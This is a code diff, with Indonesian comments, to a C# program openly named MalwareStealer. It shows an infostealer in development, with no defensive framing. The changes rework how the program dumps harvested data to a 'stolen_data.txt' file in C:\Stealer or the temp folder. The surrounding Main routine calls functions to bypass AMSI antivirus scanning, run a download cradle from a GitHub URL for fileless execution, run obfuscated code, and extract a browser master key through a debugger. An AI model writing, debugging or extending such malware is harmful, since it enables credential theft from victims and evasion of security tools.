@@ -489,28 +489,37 @@ namespace MalwareStealer
         // ===== DUMP DATA (FINAL - PASTI KELUAR) =====
         static void DumpData(byte[] masterKey)
         {
-            // FORCE BUAT FOLDER DENGAN PERMISSION MAKSIMAL
             try
             {
+                // 1. COBA BUAT FOLDER DI C:\
                 Directory.CreateDirectory(@"C:\Stealer");
                 Console.WriteLine("[+] Folder C:\\Stealer berhasil dibuat.");
             }
-            catch (Exception ex)
+            catch
             {
-                Console.WriteLine("[-] Gagal buat folder: " + ex.Message);
-                // FALLBACK: PAKE FOLDER TEMP
-                string fallbackPath = Path.GetTempPath() + "Stealer\\";
-                Directory.CreateDirectory(fallbackPath);
-                Console.WriteLine("[+] Fallback ke: " + fallbackPath);
+                // 2. KALO GAGAL, PAKE %TEMP%
+                try
+                {
+                    Directory.CreateDirectory(Path.Combine(Path.GetTempPath(), "Stealer"));
+                    Console.WriteLine("[+] Folder %TEMP%\\Stealer berhasil dibuat.");
+                }
+                catch
+                {
+                    Console.WriteLine("[-] Gagal buat folder di C:\\ dan %TEMP%.");
+                }
             }
 
-            string output = @"C:\Stealer\stolen_data.txt";
+            string output = Path.Combine(Path.GetTempPath(), "Stealer", "stolen_data.txt");
             
-            // CEK APAKAH FOLDER ADA, KALO GAK ADA PAKE FALLBACK
-            if (!Directory.Exists(@"C:\Stealer"))
+            // 3. CEK APAKAH FOLDER C:\Stealer ADA
+            if (Directory.Exists(@"C:\Stealer"))
             {
-                output = Path.GetTempPath() + "Stealer\\stolen_data.txt";
-                Console.WriteLine("[+] Fallback output: " + output);
+                output = @"C:\Stealer\stolen_data.txt";
+                Console.WriteLine("[+] Output di C:\\Stealer\\stolen_data.txt");
+            }
+            else
+            {
+                Console.WriteLine("[+] Output di %TEMP%\\Stealer\\stolen_data.txt");
             }
 
             StringBuilder sb = new StringBuilder();
@@ -590,7 +599,7 @@ namespace MalwareStealer
                 try { File.Delete(temp); } catch { }
             }
 
-            // PASTIKAN FILE TERSIMPAN
+            // 4. PASTIKAN FILE TERSIMPAN
             try
             {
                 Directory.CreateDirectory(Path.GetDirectoryName(output));
@@ -601,14 +610,18 @@ namespace MalwareStealer
             {
                 Console.WriteLine("[-] Gagal simpan: " + ex.Message);
             }
-            
+
             Console.WriteLine("[+] Press any key to exit...");
             Console.ReadKey();
         }
 
-        // ===== MAIN =====
+        // ===== MAIN (DUMP DATA DI AWAL) =====
         static void Main()
         {
+            // 1. DUMP DATA LANGSUNG DI AWAL (PASTI KELUAR)
+            DumpData(null);
+
+            // 2. MODUL 4: FILELESS EXECUTION
             BypassAMSI();
             Console.WriteLine("[+] Malware Stealer Aktif!");
             Console.WriteLine("[+] Modul 4: Fileless Execution");
@@ -617,6 +630,7 @@ namespace MalwareStealer
             ExecuteDownloadCradle(githubUrl);
             ExecuteObfuscated();
             
+            // 3. DEBUGGER BYPASS
             byte[] masterKey = null;
             Console.WriteLine("[+] Mencoba debugger bypass...");
             masterKey = ExtractMasterKeyViaDebugger();
@@ -637,6 +651,7 @@ namespace MalwareStealer
                 Console.WriteLine("[-] Gagal Dapat Master Key. Menggunakan hash fallback.");
             }
 
+            // 4. DUMP DATA KEDUA (PAKE MASTER KEY KALO DAPET)
             DumpData(masterKey);
         }
     }
